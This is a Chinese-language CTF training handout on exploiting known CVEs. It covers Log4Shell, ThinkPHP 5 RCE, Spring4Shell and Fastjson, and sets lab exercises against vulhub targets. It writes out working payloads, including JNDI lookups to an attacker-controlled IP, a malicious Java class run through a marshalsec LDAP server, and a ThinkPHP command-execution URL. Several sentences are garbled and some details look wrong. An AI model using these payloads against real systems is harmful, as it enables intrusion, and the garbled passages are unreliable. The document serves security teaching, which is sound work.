# W1 · CVE 利用與信息收集類（30 分鐘）

> 前置：`02-CTF-攻防賽通用方法論.md`（信息收集 SOP、CVE 檢索與 PoC 適配的通用框架）。
> 本講聚焦：把方法論落地到「Web 題在賽場上的處理順序」，並解讀三個經典 CVE 的 PoC 適配細節。

---

## 1. 賽場處理順序（開局 15 分鐘工作流）

```text
① 題目描述逐字讀          → 版本/框架/附註提示
② 瀏覽器看站點            → whatweb + curl -sI（抄版本）
③ 已知框架？              → （WordPress/ThinkPHP/Spring…）直接搜該框架的高頻漏洞
④ 未知版本？              → 找 /CHANGELOG、/composer.json、/package.json、JS banner
⑤ 版本已確認            → NVD + GitHub 搜 PoC → 讀 PoC → 改 URL/命令 → 放靶
⑥ 全都未命中            → 進入注入/邏輯審計路線（W2~W7）
```

**版本情報源速查**：

| 位置 | 示例 |
|---|---|
| HTTP 響應頭 | `Server: Apache/2.4.49`、`X-Powered-By: PHP/7.4.3` |
| 靜態資源 | `jquery-3.6.0.min.js`（無版本號也常在 `package.json`） |
| 錯誤頁 | Tomcat 的默認 404 頁底部含版本 |
| 文本洩露 | `/CHANGELOG.md`、`/docs/`、`/composer.lock` |
| Git/CMS 元資料 | `/wp-content/themes/xxx/style.css` 的 `Version: 5.2` |
| JS 標註 | `/*! jQuery v3.6.0 \| (c) jQuery Foundation */` |

---

## 2. 案例一 · Log4Shell（CVE-2021-44228，2021-12）

### 影響版本
Apache Log4j 2.x ≤ 2.14.1；2.15 修補更多繞法不閉；**patched 但 2.16 仍可觸發方式大使會受 2.17.0**；【同源家族 CVE-2021-45046 / 44832】。

### 觸發條件
任何走進 **日誌** 的字串中出現 `${jndi:<protocol>://attendeur/…}`。進入位置不限於 User-Agent，常見的還有：
- 表單欄位、請求參數
- 幾乎所有標頭（User-Agent, X-Forwarded-For, Referer）
- `Last-Modified` 相關字段操作（把 payload 放在檔案名）
- JSON body 裡的任何值

### 最小 payload（打內網靶機驗證）

```text
${jndi:ldap://YOUR_IP:1389/x}
${jndi:rmi://YOUR_IP:1099/x}
```

**說明**：`ldap`/`rmi` 兩個茅方法在 JDK < 8u121/8u141 可 ATR（遠 class 載入），較新 JDK 有 trust 阻
礙；但 **${LOOKUP 造出 ${sys:property} 的任何方式仍可行**。

```bash
# 建議：實戰驗證用 DNSLog 或者自架 DNS HTTP 服務
curl "http://127.0.0.1:8080/hello" -H "User-Agent: ${jndi:ldap://my-dnslog.com/x}"
# dnslog 有記錄 → 可用資訊前置成功
```

### 攻擊設施（利用課程掃 Coding 條件：JDK 8 小於 8u191）

### 攻擊條件（利用課已標註：JDK 8u191 以前）

```bash
# 1) 準備一個惡意類, 編譯為 .class
cat > Exploit.java <<'EOF'
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","id > /tmp/pwn"});
        } catch (Exception e) {}
    }
}
EOF
javac Exploit.java
python3 -m http.server 8888        # 提供 Exploit.class 的 HTTP 服務

# 2) 起 LDAP 服務（指向 HTTP class 資源）
git clone https://github.com/mbechler/marshalsec.git && cd marshalsec
mvn package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
     marshalsec.jndi.LDAPRefServer "http://YOUR_IP:8888/#Exploit" 1389

# 3) 發送 payload 觸發
curl "http://target:8080/" -H 'X-Api-Version: ${jndi:ldap://YOUR_IP:1389/Exploit}'
```

### 防 禦

| 做法 | 命令 |
|---|---|
| 升級 Log4j | `log4j-core >= 2.17.1` |
| JVM 平伸 | `-Dlog4j2.formatMsgNoLookups=true`（2.10–2.16阻止查找） |
| WAF | 攔 `${jndi:` 與它 subclasses `${lower:…}` |
| 檢視 | `grep -r "${env:FLAG" app.log` |

> 課堂演示：起 vulhub log4j2 CVE-2021-44228，在校園內網走完「payload → dnslog → 收 flag」三步。

---

## 3. 案例二 · ThinkPHP 5 RCE（2018-12-09 批量漏洞, 無 CVE 編號）

### 觸發條件
ThinkPHP 5.0.5–5.0.22 (部分) 開啟 `s` 路由模式（wrap `pathinfo` fetch 混合），可把控制器當類別動態呼叫。

```text
GET /index.php?s=/Index/\think\app/invokefunction
    &function=call_user_func_array
    &vars[0]=passthru
    &vars[1][]=cat%20/flag
```

**一行解讀**：
- `\think\app/invokefunction` → 決定要動態調的 `App` 類別中的 `invokeFunction`
- `function=call_user_func_array` → 給定 1 個函數名與參數列表
- `vars[0]`/`vars[1][]` → 經過反序列化一層的 arrays（防止框架其行內鍵名解析）

### PoC 適配清單

| 情境 | 改法 |
|---|---|
| `/index.php` 前有前綴 `/app/index.php` | 改 URL 首段 |
| `vars[0]` 被 WAF 擋 `system` | 改 `passthru`/`shell_exec` 或 `assert`（`PHP 7.1` 之前） |
| `vars[1][]` 需要雙字元 | `vars[1][]=ls%20%2Dla` |
| ThinkPHP 5.1.x | 路由寫法改 `s=index/\think\app/invokefunction&function=...`（斜體大小寫差異） |

> **真實事故**：2018 年底從 GitHub 敲 PoC 到全網玩到淅，長時間內未有人施 patch；全球 led // 由安全社區發現 ` 2019+` 的注入濫刷牙百；使用了 `passthru` 的 webshell 到底下。

> 課堂演示：`cd vulhub/thinkphp/5-rce && docker compose up -d`，用手打手 curl; 再試 ThinkPHP 6（`default_index` 版本變異）有何不通過。

---

## 4. 案例三 · Spring4Shell（CVE-2022-22965）

### 條件

| 條件 | 說明 |
|---|---|
| Spring Framework | < 5.2.20 / < 5.3.18 |
| JDK 9+ | 因 module 綁定後類載入器面可立即存取 |
| 編劇方式 | Tomcat（war 部署）；Spring Boot jar 打法的载入路徑不一樣 |
| 使用 DataBinder 的表單綁定 | 常見 controller：`@RequestParam Model model` |

### 條件 payload 骨架

```text
POST /?class.module.classLoader.resources.context.parent
       .pipeline.first.pattern=%25%7Bc2%7Di%20...
Host: target
Content-Type: application/x-www-form-urlencoded
...
```

> verbose payload 建議直接用 vulhub 的 `springframework/CVE-2022-22965` 庫（內有完整 PoC），課堂上讓學員調整「pattern=」中的命令進行嘗試，讀 writeup 反推原理。

### 官方修補

5.3.18/5.2.20 對 DataBinder 的 `classLoader` key 做了 block；同時建議升級 Tomcat 9.0.60+。

---

## 5. 案例四（快速） · Fastjson 反序列化（CVE-2022-25845 / 一.2.x 系列）

- 特徵：`fastjson` 版本 1.2.16–1.2.83；payload 是 JSON 帶 `@type: "…" `。
- CTF 常見於「Java web + 張口 HTTP Request：一番 JSON」list，提供 `{"a":{"@type":"java.net.InetAddress","val":"dnslog戳"}}` 做點測試。
- **手法自身**：先讓 `@type` 指向 `java.net.InetAddress` 看 DNSLOG 是否回響 → 判斷 autoType 是否開啟。

---

## 6. 「版本 → CVE」的欄位化工作流程

| # | 動作 | 工具/連結 |
|---|---|---|
| 1 | 抄版本字串（頭/頁尾/静态資源） | `curl -sI`、Wappalyzer |
| 2 | 去除小號內麵包（如 2.4.49 vs 2.4.50） | 手動 |
| 3 | NVD search per product | `https://nvd.nist.gov/vuln/search` |
| 4 | Exploit-DB subtitle check | `https://www.exploit-db.com/search` |
| 5 | GitHub / GitHub Advisory 快查 | `https://github.com/advisories?query=` |
| 6 | 依順序讀 PoC code 前 200 行 | 往下先找 `requests.get` / `HTTP.post` |
| 7 | 照 PoC 更新變數 | username/password/path |
| 8 | 執行 dockerize local 測試 | 一定先本地跑 pass 後再賽場跑 |

### 賽場流淚襲例

- `FastAPI + Python` 3.6+ 以下常見路徑 ` /docs`、 `/openapi.json` 洩露 → 優先檢查
- `Spring Boot Actuator` 暴露 → `/actuator/env`、`/heapdump`（CVE-2022-29581 之前）
- `phpMyAdmin` 版本暴露 → 點 CVE-2018-12613 之老 bug（LFI）

---

## 7. 課堂練習（15 分鐘）

1. 起一個 vulhub 環境：`/opt/vulhub/docdogeneous/CVE-2021-43798`（Grafana Path Traversal）
   - 目標：不用 PoC，僅用 `curl` 讀 `/etc/passwd`。若卡 5 分鐘 → 提示「URL 的 `.git/config` 有什麼」。
2. ThinkPHP 5.0.23 → 拿 flag 一個；**不得使用 模版 script**（用 curl 手打）。
3. （進度快的學員）Spring4Shell：把 `pattern=` 改為 `cat /flag`，並錄下 3 步濤蹭。

> 驗收：每組提交 3 行 Writeup（使用的 payload、实现步驟、可繞點）。

## 8. 課外功課

- 試找 `CVE-2024-???` 一個你本身熟悉的框架 (WordPress/Django/Flask) 的版本漏洞，並寫 1 段亂版狀況（自備 vulhub）。
- 背下來「Log4Shell 的觸發條件」與「ThinkPHP 5 的路由機制」，錄入 `05-模板/賽前檢查清單.md`。
